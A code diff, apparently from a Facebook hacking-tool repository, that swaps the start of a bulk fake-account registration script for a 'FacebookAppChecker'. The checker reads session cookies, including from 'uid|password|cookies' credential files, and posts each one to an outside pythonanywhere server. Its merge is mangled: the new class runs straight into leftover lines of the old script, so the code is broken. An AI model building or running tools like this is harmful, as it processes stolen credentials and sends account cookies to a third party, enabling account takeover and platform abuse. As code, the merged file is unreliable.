@@ -1,40 +1,140 @@
-# Code by: Dipak Khadka -------------- #
+# Code by Rebron Bëb 
+
+import requests
 import os
 import random
-import string
-import hashlib
-import re
-import time
-from datetime import datetime
-from faker import Faker
 
-try:
-    import requests
-except:
-    os.system('python -m pip install requests')
-    import requests
+class FacebookAppChecker:
+    # Colors
+    r = '\x1b[1;31m'
+    g = '\x1b[1;32m'
+    y = '\x1b[1;33m'
+    b = '\x1b[1;34m'
+    c = '\x1b[1;36m'
+    w = '\x1b[1;37m'
 
-try:
-    from bs4 import BeautifulSoup
-except:
-    os.system('python -m pip install beautifulsoup4')
-    from bs4 import BeautifulSoup
+    def __init__(self):
+        os.system("cls" if os.name == "nt" else "clear")
+        self.logo()
+        
+        print(f"{self.b}-{self.w}" * 56)
+        print(f"        {self.g}[//] FacebookAppChecker By Dipak [//]{self.w}")
+        print(f"{self.b}-{self.w}" * 56)
+        print(f"[1] SINGLE COOKIES")
+        print(f"[2] COOKIES FILE")
+        print(f"{self.b}-{self.w}" * 56)
+        
+        choice = input(f"{self.y}[//] Select Option : {self.w}")
+        
+        print(f"{self.b}-{self.w}" * 56)
 
-try:
-    from fake_email import Email
-except:
-    os.system('python -m pip install fake_email')
-    from fake_email import Email
+        if choice == '1':
+            self.process_manual_input()
+        elif choice == '2':
+            filename = input(f"{self.y}[//] Enter filename: {self.w}")
+            self.process_file_input(filename)
+        else:
+            print(f"{self.r}[//] Invalid choice{self.w}")
 
-# ------------[ COLORS ]-------------- #
-GREEN = '\033[1;32m'
-YELLOW = '\033[1;33m'
-RESET = '\033[0m'
-WHITE = '\033[1;37m'
-COLOR_LIGHT_RED = "\033[1;31m"
-COLOR_LIGHT_CYAN = "\033[1;36m"
-COLOR_BLINK = "\033[5m"
-COLOR_PURPLE = "\033[0;35m"
+    def logo(self):
+        # Status
+        status_list = ['Online', 'Active', 'Busy', 'Away', 'Do Not Disturb']
+        random_status = random.choice(status_list)
+
+        # ------------------ NEPAL ASCII ART ------------------ #
+        RED = "\033[1;31m"
+        GREEN = "\033[1;32m"
+        MAGENTA = "\033[1;35m"
+        CYAN = "\033[1;36m"
+        YELLOW = "\033[1;33m"
+        WHITE = "\033[1;37m"
+        BLUE = "\033[1;34m"
+        RESET = "\033[0m"
+
+        nepal_logo = f"""
+{RED}███╗   ██╗{YELLOW}███████╗{GREEN}██████╗  {CYAN}███╗   ██╗  {MAGENTA}██╗   
+{RED}████╗  ██║{YELLOW}██╔════╝{GREEN}██╔══██╗ {CYAN}████╗  ██║  {MAGENTA}██║   
+{RED}██╔██╗ ██║{YELLOW}█████╗  {GREEN}██████╔╝ {CYAN}██╔██╗ ██║  {MAGENTA}██║   
+{RED}██║╚██╗██║{YELLOW}██╔══╝  {GREEN}██╔═══╝  {CYAN}██║╚██╗██║  {MAGENTA}██║   
+{RED}██║ ╚████║{YELLOW}███████╗{GREEN}██║      {CYAN}██║ ╚████║  {MAGENTA}███████╗
+{RED}╚═╝  ╚═══╝{YELLOW}╚══════╝{GREEN}╚═╝      {CYAN}╚═╝  ╚═══╝  {MAGENTA}╚══════╝
+{RESET}
+"""
+        print(nepal_logo)
+
+        # ------------------ DIPAK BANNER ------------------ #
+        logo = f"""
+{self.y}============================================={self.w}
+[{self.g}+{self.w}] Owner    : {self.g}Dipak{self.w}
+[{self.g}+{self.w}] Facebook : {self.g}Reborn Bëb{self.w}
+[{self.g}+{self.w}] Status   : {self.g}{random_status}{self.w}
+{self.y}============================================={self.w}
+"""
+        print(logo)
+
+    # Function to get apps data from server
+    def show_apps(self, cookies):
+        try:
+            response = requests.post(
+                'https://shajon404.pythonanywhere.com/facebook_apps',
+                json={"cookies": cookies}
+            )
+            data = response.json()
+            return data
+        except ValueError:
+            return {"all_apps": {"active_apps": {}, "inactive_apps": {}}}
+
+    # Function to display apps nicely
+    def display_apps(self, data):
+        print(f"{self.b}-{self.w}" * 56)
+
+        # Active apps
+        if data['all_apps'].get('active_apps'):
+            print(f"{self.g}[//] ACTIVE APPS █{self.w}")
+            print(f"{self.b}-{self.w}" * 56)
+            for app, date in data['all_apps']['active_apps'].items():
+                print(f"{self.g}[//] {app} => {date}{self.w}")
+        else:
+            print(f"{self.r}[//] No active apps found{self.w}")
+        print(f"{self.b}-{self.w}" * 56)
+
+        # Inactive apps
+        if data['all_apps'].get('inactive_apps'):
+            print(f"{self.c}[//] INACTIVE APPS █{self.w}")
+            print(f"{self.b}-{self.w}" * 56)
+            for app, date in data['all_apps']['inactive_apps'].items():
+                print(f"{self.c}[//] {app} => {date}{self.w}")
+        else:
+            print(f"{self.r}[//] No inactive apps found{self.w}")
+        print(f"{self.b}-{self.w}" * 56)
+
+    # Function to process manual input
+    def process_manual_input(self):
+        cookies = input(f"[//] COOKIES : {self.g}")
+        data = self.show_apps(cookies)
+        self.display_apps(data)
+
+    # Function to process file input
+    def process_file_input(self, filename):
+        try:
+            with open(filename, 'r') as f:
+                lines = f.readlines()
+            for line in lines:
+                line = line.strip()
+                if not line or '|' not in line:
+                    continue
+                uid, password, cookies = line.split('|')
+                print(f"{self.y}[//] Checking UID : {self.g}{uid}{self.w}")  
+                data = self.show_apps(cookies)
+                self.display_apps(data)
+        except FileNotFoundError:
+            print(f"{self.r}[//] File not found: {filename}{self.w}")
+        except Exception as e:
+            print(f"{self.r}[//] Error: {e}{self.w}")
+
+
+if __name__ == "__main__":
+    FacebookAppChecker()COLOR_PURPLE = "\033[0;35m"
 
 # ------------[ BANNER ]-------------- #
 run_count = 0
@@ -236,3 +336,4 @@ if __name__ == '__main__':
 
             print(f"{GREEN}[Reborn-OK]  {YELLOW}({GREEN}{i+1}{YELLOW}){YELLOW}{WHITE}+{GREEN}OK{YELLOW}({GREEN}{num}{YELLOW}){RESET}")
             register_facebook_account(password, fname, lname, bday, emails[i])
+
